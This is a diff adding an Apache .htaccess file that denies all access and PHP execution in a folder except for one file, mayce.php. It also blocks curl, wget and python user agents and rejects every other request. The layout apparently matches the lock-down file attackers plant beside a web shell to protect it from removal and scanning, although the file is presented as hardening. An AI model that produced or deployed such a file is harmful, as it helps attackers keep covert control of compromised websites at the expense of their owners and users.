@@ -1,0 +1,39 @@
+# ==== BLOCK PUBLIC ACCESS COMPLETELY ====
+Order allow,deny
+Deny from all
+
+# ==== DISABLE PHP EXECUTION (except mayce.php) ====
+<FilesMatch "\.(php|php5|php7|phtml)$">
+    SetHandler none
+</FilesMatch>
+
+# Allow only mayce.php to run
+<Files "mayce.php">
+    Allow from all
+    Satisfy any
+</Files>
+
+# ==== PREVENT DIRECTORY LISTING ====
+Options -Indexes
+
+# ==== PREVENT FILE EDIT/DELETE VIA HTTP ====
+<Limit PUT DELETE PATCH>
+    Deny from all
+</Limit>
+
+# ==== EXTRA PROTECTION ====
+# Mencegah script lain mengakses folder ini
+<IfModule mod_autoindex.c>
+    IndexIgnore *
+</IfModule>
+
+# ==== BLOCK COMMON SCANNER USER-AGENTS ====
+BrowserMatchNoCase "curl" bad_bot
+BrowserMatchNoCase "wget" bad_bot
+BrowserMatchNoCase "python" bad_bot
+Deny from env=bad_bot
+
+# ==== BLOCK HOT-LINKING DAN REQUEST ASING ====
+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME} !mayce\.php$
+RewriteRule .* - [F]
